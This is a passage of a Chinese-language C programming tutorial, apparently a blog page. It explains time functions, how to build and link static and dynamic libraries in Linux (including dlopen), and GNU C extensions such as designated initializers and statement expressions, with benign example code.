<h4 id="strftime"><a href="#strftime" class="headerlink" title="strftime()"></a><code>strftime()</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">strftime</span><span class="params">(<span class="type">char</span> *s, <span class="type">size_t</span> max, <span class="type">const</span> <span class="type">char</span> *format, <span class="type">const</span> <span class="keyword">struct</span> tm *tm)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：格式化时间，将<code>tm</code>结构体格式化为字符串。</li>
<li>参数：<ul>
<li><code>s</code>：存储格式化结果的缓冲区。</li>
<li><code>max</code>：缓冲区的最大长度。</li>
<li><code>format</code>：格式控制字符串。</li>
<li><code>tm</code>：指向<code>tm</code>结构体。</li>
</ul>
</li>
<li>返回值：成功则返回写入缓冲区的字符数，失败则返回0。</li>
</ul>
<p>常用格式：</p>
<ul>
<li><code>%Y</code>：年份（如2023）</li>
<li><code>%m</code>：月份（01到12）</li>
<li><code>%d</code>：月份中的天数（01到31）</li>
<li><code>%H</code>：小时（00到23）</li>
<li><code>%M</code>：分钟（00到59）</li>
<li><code>%S</code>：秒（00到60）</li>
</ul>
<h4 id="difftime"><a href="#difftime" class="headerlink" title="difftime()"></a><code>difftime()</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">difftime</span><span class="params">(<span class="type">time_t</span> time1, <span class="type">time_t</span> time0)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：计算两个时间点之间的差，以秒为单位。</li>
<li>参数：两个<code>time_t</code>时间值。</li>
<li>返回值：时间差，单位为秒。</li>
</ul>
<h4 id="clock-gettime"><a href="#clock-gettime" class="headerlink" title="clock_gettime()"></a><code>clock_gettime()</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">clock_gettime</span><span class="params">(<span class="type">clockid_t</span> clk_id, <span class="keyword">struct</span> timespec *tp)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>功能：获取指定时钟的时间。</li>
<li>参数：<ul>
<li><code>clk_id</code>：时钟标识，如<code>CLOCK_REALTIME</code>（系统实时时钟）、<code>CLOCK_MONOTONIC</code>（不受系统时间改变影响的时钟）。</li>
<li><code>tp</code>：指向<code>timespec</code>结构体的指针，用于存储获取的时间值。</li>
</ul>
</li>
<li>返回值：成功返回0，失败返回-1。</li>
</ul>
<h4 id="strptime"><a href="#strptime" class="headerlink" title="strptime()"></a><code>strptime()</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strptime</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s, <span class="type">const</span> <span class="type">char</span> *format, <span class="keyword">struct</span> tm *tm)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>功能：解析字符串时间，根据指定格式填充<code>tm</code>结构体。</li>
<li>参数：<ul>
<li><code>s</code>：输入时间字符串。</li>
<li><code>format</code>：格式控制字符串，定义如何解析<code>tim</code>字符串。</li>
<li><code>tm</code>：指向<code>tm</code>结构体，用于存储解析结果。</li>
</ul>
</li>
<li>返回值：指向处理完的字符串部分的指针。</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>以下代码示范了如何使用上述函数来获取和处理时间：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 使用 clock_gettime</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line">    clock_gettime(CLOCK_REALTIME, &amp;ts);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Seconds: %ld, Nanoseconds: %ld\n&quot;</span>, ts.tv_sec, ts.tv_nsec);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 time 和 localtime</span></span><br><span class="line">    <span class="type">time_t</span> now = time(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">local</span> =</span> localtime(&amp;now);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Local time: %s&quot;</span>, ctime(&amp;now));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 strftime</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">80</span>];</span><br><span class="line">    strftime(buffer, <span class="keyword">sizeof</span>(buffer), <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, local);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Formatted local time: %s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 strptime</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">parsed_time</span>;</span></span><br><span class="line">    <span class="type">char</span> *result = strptime(<span class="string">&quot;2024-12-01 12:34:56&quot;</span>, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, &amp;parsed_time);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parsed day of the month: %d\n&quot;</span>, parsed_time.tm_mday);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to parse time\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="动态库与静态库"><a href="#动态库与静态库" class="headerlink" title="动态库与静态库"></a>动态库与静态库</h2><p>对于二进制安全研究者对于动静态库的编译链接，动态链接流程应该很熟悉，起码知道<code>plt</code>表和<code>got</code>表的关系，<code>got</code>表何时保存真实地址。</p>
<p>在 Linux 中，库分为两种主要类型：静态库和动态库。这两种库都用于封装可重用的代码和资源，但它们的使用和制作方式有所不同。下面是详细的介绍。</p>
<h3 id="静态库（Static-Library）"><a href="#静态库（Static-Library）" class="headerlink" title="静态库（Static Library）"></a>静态库（Static Library）</h3><p>静态库是将多个目标文件（.o 文件）打包成一个单一文件（通常以 <code>.a</code> 结尾），在链接时直接与可执行文件合并。使用时只需要包含<code>.h</code>文件并在链接时指定<code>.a</code>即可。</p>
<h4 id="1-静态库的特点"><a href="#1-静态库的特点" class="headerlink" title="1. 静态库的特点"></a>1. 静态库的特点</h4><ul>
<li><strong>打包</strong>：在编译时将所有需要的代码编译并打包到一个静态库文件。</li>
<li><strong>代码包含</strong>：最终生成的可执行文件中包含了使用的库的所有代码，因此不会受到库文件是否存在的影响。</li>
<li><strong>版本管理</strong>：每当库代码更改时，需要重新编译使用该库的所有可执行文件。</li>
</ul>
<h4 id="2-制作静态库的步骤"><a href="#2-制作静态库的步骤" class="headerlink" title="2. 制作静态库的步骤"></a>2. 制作静态库的步骤</h4><ol>
<li><p><strong>编写源代码</strong>（假设有多个文件，如 <code>foo.c</code> 和 <code>bar.c</code>）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from foo!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bar.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from bar!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>编译源代码为目标文件（.o 文件）</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c foo.c  <span class="comment"># 生成 foo.o</span></span><br><span class="line">gcc -c bar.c  <span class="comment"># 生成 bar.o</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用 <code>ar</code> 命令创建静态库</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar rcs libmylibrary.a foo.o bar.o</span><br></pre></td></tr></table></figure></div>
<p>这里：</p>
<ul>
<li><code>r</code> 表示插入文件。</li>
<li><code>c</code> 表示创建静态库。</li>
<li><code>s</code> 表示创建索引。</li>
</ul>
</li>
<li><p><strong>使用静态库进行链接</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myprogram main.c -L. -lmylibrary</span><br></pre></td></tr></table></figure></div>
<p>其中，<code>-L.</code> 指定库路径为当前目录，<code>-lmylibrary</code> 指定库名称（去掉前缀 <code>lib</code> 和后缀 <code>.a</code>）。</p>
</li>
</ol>
<h3 id="动态库（Dynamic-Library）"><a href="#动态库（Dynamic-Library）" class="headerlink" title="动态库（Dynamic Library）"></a>动态库（Dynamic Library）</h3><p>动态库在运行时链接，也称为共享库，通常以 <code>.so</code> 结尾。与静态库不同，动态库在程序运行时被加载。</p>
<h4 id="1-动态库的特点"><a href="#1-动态库的特点" class="headerlink" title="1. 动态库的特点"></a>1. 动态库的特点</h4><ul>
<li><strong>共享</strong>：多个程序可以共享同一个库，降低内存使用。</li>
<li><strong>更新方便</strong>：更新库文件后，所有依赖该库的程序可以立即受益，而无需重新编译它们。</li>
<li><strong>动态链接</strong>：在程序启动时或运行时动态加载库，代码不会嵌入到可执行文件中。</li>
</ul>
<h4 id="2-制作动态库的步骤"><a href="#2-制作动态库的步骤" class="headerlink" title="2. 制作动态库的步骤"></a>2. 制作动态库的步骤</h4><ol>
<li><p><strong>编写源代码</strong>（同样的例子）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from foo!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bar.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from bar!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>编译源文件为位置无关的代码（-fPIC 标志）</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -c foo.c  <span class="comment"># 生成 foo.o</span></span><br><span class="line">gcc -fPIC -c bar.c  <span class="comment"># 生成 bar.o</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用 <code>gcc</code> 创建动态库</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o libmylibrary.so foo.o bar.o</span><br></pre></td></tr></table></figure></div>
<p>这里：</p>
<ul>
<li><code>-shared</code> 标志告诉编译器生成共享库。</li>
</ul>
</li>
<li><p><strong>使用动态库进行链接</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myprogram main.c -L. -lmylibrary</span><br></pre></td></tr></table></figure></div>
<p>模式同静态库一样。</p>
</li>
<li><p><strong>设置环境变量</strong>（可选）：</p>
<ul>
<li>如果动态库不在标准路径下，可以设置环境变量 <code>LD_LIBRARY_PATH</code> 来告诉链接器查找库的位置。</li>
</ul>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:.</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用dlopen</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __ADD_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ADD_H__</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __ADD_H__</span></span></span><br><span class="line"><span class="comment">// add.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;add.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">void</span> *handle;</span><br><span class="line">    <span class="type">int</span> (*add)(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line">&#125; <span class="type">g_dyn_add_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">load_dyn_libadd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">g_dyn_add_t</span>.handle = dlopen(<span class="string">&quot;./libadd.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="type">g_dyn_add_t</span>.handle) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: %s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">g_dyn_add_t</span>.add = dlsym(<span class="type">g_dyn_add_t</span>.handle, <span class="string">&quot;add&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="type">g_dyn_add_t</span>.add)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: %s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>, c;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; load_dyn_libadd())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: failed to load dynamic library\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    c = <span class="type">g_dyn_add_t</span>.add(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sum of %d and %d is %d\n&quot;</span>, a, b, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<hr>
<table>
<thead>
<tr>
<th>特性</th>
<th>静态库</th>
<th>动态库</th>
</tr>
</thead>
<tbody><tr>
<td>连接时机</td>
<td>编译时</td>
<td>运行时</td>
</tr>
<tr>
<td>文件扩展</td>
<td><code>.a</code></td>
<td><code>.so</code></td>
</tr>
<tr>
<td>内存使用</td>
<td>每个程序都有一份</td>
<td>多个程序共享一份</td>
</tr>
<tr>
<td>更新库的方式</td>
<td>需要重编所有程序</td>
<td>只需更新库文件</td>
</tr>
<tr>
<td>库的使用</td>
<td>更复杂的管理</td>
<td>更新简单，方便使用</td>
</tr>
</tbody></table>
<p>静态库和动态库各自有优缺点，开发者可以根据项目需求选择合适的方式。常见的做法是将相对稳定的基础库做成动态库，而不常更改的功能模块则可以选择静态库以便提升性能。</p>
<h2 id="GNU-C-扩展语法"><a href="#GNU-C-扩展语法" class="headerlink" title="GNU C 扩展语法"></a>GNU C 扩展语法</h2><h3 id="指定初始化"><a href="#指定初始化" class="headerlink" title="指定初始化"></a>指定初始化</h3><hr>
<p><strong>数组初始化</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">100</span>] = &#123;[<span class="number">10</span>] = <span class="number">1</span>, [<span class="number">30</span>] = <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这样<code>arr[10]</code>和<code>arr[30]</code>便被初始化为<code>1</code>，数组内其他元素则是<code>0</code>。通过数组元素索引，我们可以直接给指定的数组元素赋值。除了数组，一个结构体变量的初始化，也可以通过指定某个结构体成员直接赋值。在早期C语言标准不支持指定初始化时，GCC编译器就已经支持指定初始化了，因此这个特性也被看作GCC编译器的一个扩展特性。</p>
<hr>
<p><strong>范围初始化</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">100</span>] = &#123;[<span class="number">10</span> ... <span class="number">30</span>] = <span class="number">1</span>, [<span class="number">50</span> ... <span class="number">60</span>] = <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> score</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span> ... <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span> ... <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>GNU C支持使用<code>...</code>表示范围扩展，这个特性不仅可以使用在数组初始化中，也可以使用在<code>switch-case</code>语句中。</p>
<hr>
<p><strong>结构体初始化</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MAX_SIZE];</span><br><span class="line">&#125; * hello_devp;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">loff_t</span> <span class="title function_">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">hello_fops</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .llseek = hello_llseek,</span><br><span class="line">        .read = hello_read,</span><br><span class="line">        .write = hello_write,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">        .open = hello_open,</span><br><span class="line">        .release = hello_releace,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在Linux内核驱动中，大量使用GNU C的这种指定初始化方式，通过结构体成员来初始化结构体变量。如在字符驱动程序中，我们经常见到这样的初始化。在驱动程序中，我们经常使用<code>file_operations</code>这个结构体来注册我们开发的驱动，然后系统会以回调的方式来执行驱动实现的具体功能。</p>
<h3 id="语句表达式"><a href="#语句表达式" class="headerlink" title="语句表达式"></a>语句表达式</h3><hr>
<p>GNU C对C语言标准作了扩展，允许在一个表达式里内嵌语句，允许在表达式内部使用局部变量、for循环和<code>goto</code>跳转语句。这种类型的表达式，我们称为语句表达式。语句表达式的格式如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;a; b; c;&#125;)</span><br></pre></td></tr></table></figure></div>

<p>语句表达式最外面使用小括号()括起来，里面一对大括号{}包起来的是代码块，代码块里允许内嵌各种语句。语句的格式可以是一般表达式，也可以是循环、跳转语句。和一般表达式一样，语句表达式也有自己的值。语句表达式的值为内嵌语句中最后一个表达式的值。我们举个例子，使用语句表达式求值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sum = (&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i);</span><br><span class="line">    i;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p>最后  <code>sum = 10;</code></p>
<hr>
<h3 id="宏定义中的语句表达式"><a href="#宏定义中的语句表达式" class="headerlink" title="宏定义中的语句表达式"></a>宏定义中的语句表达式</h3><hr>
